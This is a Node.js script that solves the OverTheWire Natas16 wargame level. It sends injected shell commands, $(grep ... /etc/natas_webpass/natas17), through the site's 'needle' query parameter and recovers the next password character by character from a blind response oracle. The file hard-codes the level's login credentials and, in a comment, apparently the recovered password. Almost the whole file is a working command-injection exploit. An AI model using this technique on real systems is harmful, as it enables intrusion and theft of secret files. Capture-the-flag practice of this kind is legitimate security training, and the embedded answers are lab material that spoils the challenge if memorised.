#!/usr/bin/env node
/* eslint-disable */
fs = require('fs');
child = require('child_process');
exec = child.execSync;
http = require('http');
querystring = require('querystring');

table = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
login = 'natas16';
password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh';
abc='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
set='rGbdkPS5nqw0gNcAsQhHmW7938';
solution='';
//8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

let gen = 0;
let n = 0;

function init() {
    console.log(gen++)
    // init
    for (let i = 0; i < abc.length; i++) {
        doReq(abc[i]);
    }
}

function rec() {
    console.log("times recursed: ", ++gen)
    for (let i = 0; i < set.length; i++) {
        doReq(set[i], solution, gen);
    }
}

function doReq(char, pass, gen=0) {
    console.log('total:', n++)
    console.log('generation:', gen)
    command=`unthinkable$(grep -n ^${pass}${char} /etc/natas_webpass/natas17)`;
    query = querystring.escape(command)
    const options = {
        host: 'natas16.natas.labs.overthewire.org',
        path: '/?needle=' + query,
        method: 'GET',
        auth: `${login}:${password}`
    };

    const req = http.request(options, (res) => {
    res.setEncoding('utf8');
    total = '';
    res.on('data', (chunk) => {
        total += chunk;
    });
    res.on('end', () => {
        match = total.match("unthinkable");
        if(!match) {
            solution += char;
            console.log('' + char);
            console.log('' + solution);
            if(gen>0)
                rec();
            else
                set += char;
        }
    });
    });

    req.on('error', (e) => {
        console.error(`problem with request: ${e.message}`);
        process.exit();
    });

    req.end();
}

// Generate the set
if (!set)
    init();
else
    rec()
